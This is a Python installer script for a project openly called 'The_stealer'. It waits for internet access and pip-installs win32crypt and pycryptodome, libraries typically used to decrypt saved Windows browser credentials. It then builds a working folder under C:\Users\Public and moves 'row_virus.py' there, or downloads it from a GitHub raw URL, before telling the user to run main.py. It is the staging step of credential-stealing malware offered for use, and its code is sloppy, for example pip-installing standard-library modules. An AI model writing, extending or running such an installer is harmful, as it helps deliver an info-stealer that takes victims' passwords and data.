def check_internet_connection():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:sock.connect(("www.google.com", 80));return True
    except socket.error:return False
    finally:sock.close()
import socket
from datetime import timedelta,datetime,timezone
import time
import subprocess
import random
while True:
    if check_internet_connection():break
    else:time.sleep(5);print('waiting for internet')
try:import pip
except ImportError:
    try:import ensurepip;ensurepip.bootstrap()
    except ImportError: pass
try:import os
except ImportError as e:subprocess.call(['pip3','install','os']) 
try:import platform
except ImportError as e:subprocess.call(['pip3','install','platform']) 
try:import json
except ImportError as e:subprocess.call(['pip3','install','json'])
try:import sqlite3
except ImportError as e:subprocess.call(['pip3','install','sqlite3'])
try:import shutil
except ImportError as e:subprocess.call(['pip3','install','shutil'])
try:from termcolor import colored
except Exception as e:subprocess.call(['pip3','install','termcolor'])
try:import tkinter
except Exception as e:subprocess.call(['pip3','install','tkinter'])
try:import win32crypt
except Exception as e:subprocess.call(['pip3','install','pypiwin32'])
try:import base64
except Exception as e:subprocess.call(['pip3','install','base64'])
try:import webbrowser
except Exception as e:subprocess.call(['pip3','install','webbrowser'])
try:import Crypto.Cipher
except Exception as e:subprocess.call(['pip3','install','pycryptodome'])
try:import requests
except Exception as e:subprocess.call(['pip3','install','requests'])

def create_path(path:str,check_file=False,json_file=False,content={"name":None}):
    '''Checks if the path exists and creates it if it doesn't.If check_file is True, checks for the existence of a file.'''
    if json_file:check_file=True
    if not check_file:None if os.path.exists(path) else os.mkdir(path)
    else:
        if json_file:json.dump(content,file:=open(path,'w'));file.close()
        else:file=open(path,'w+');file.write(content);file.close()
# =====>paths list <=========================
root_path='C:\\Users\\Public\\akki'
main_path=root_path+'\\The_stealer'
dev_resorse=main_path+'\\dev_path'
# ['info_mv.json','row_virus.txt']
info_resorse=main_path+'\\info_path'
path_to_row_virus='C:\\Users\\Public\\akki\\The_stealer\\dev_path'
current_directory = os.getcwd()
create_path(root_path)
create_path(main_path)
create_path(dev_resorse)
create_path(dev_resorse+'\\info_mv.json',check_file=True,json_file=True,content={"name_of_attacks":{'demo':'demo'},})
create_path(info_resorse)
try:
    shutil.move(current_directory+'\\row_virus.py',path_to_row_virus)
except FileNotFoundError:
    while True:
        try:
            response=requests.get("https://raw.githubusercontent.com/Akkiraj1234/the_stealer/main/row_virus.py")
            if response.status_code==200:
                with open(path_to_row_virus+'row_virus.py','w+',encoding='UTF-8') as test:test.write(response.text)
                break
            else:
                while True:
                    if check_internet_connection():break
                    else:time.sleep(5);print('conect the internet')
        except ConnectionError or TimeoutError:
            while True:
                if check_internet_connection():break
                else:print('Connect to the internet');time.sleep(5)
        except requests.HTTPError or Exception as e:
            print(f"HTTP error: {e}")
            print('coude not move the folder to destination path move it manually')
            print('file to move ',current_directory+'\\row_virus.py')
            print('where to move ',path_to_row_virus)
            break
except PermissionError:
    print("Permission denied when moving the file or writing to the destination folder.")
    print('coude not move the folder to destination path move it manually')
    print('file to move ',current_directory+'\\row_virus.py')
    print('where to move ',path_to_row_virus)
    
    


print('you all done')
time.sleep(0.5)
print('for using the software just run main.py and software start woking')
time.sleep(0.5)
print('you can also delet the git clone version of the stealer its no longer use')
time.sleep(0.5)
print('you can move main.py to whenver u want just dont delete the main.py')
time.sleep(0.5)
nothing=input()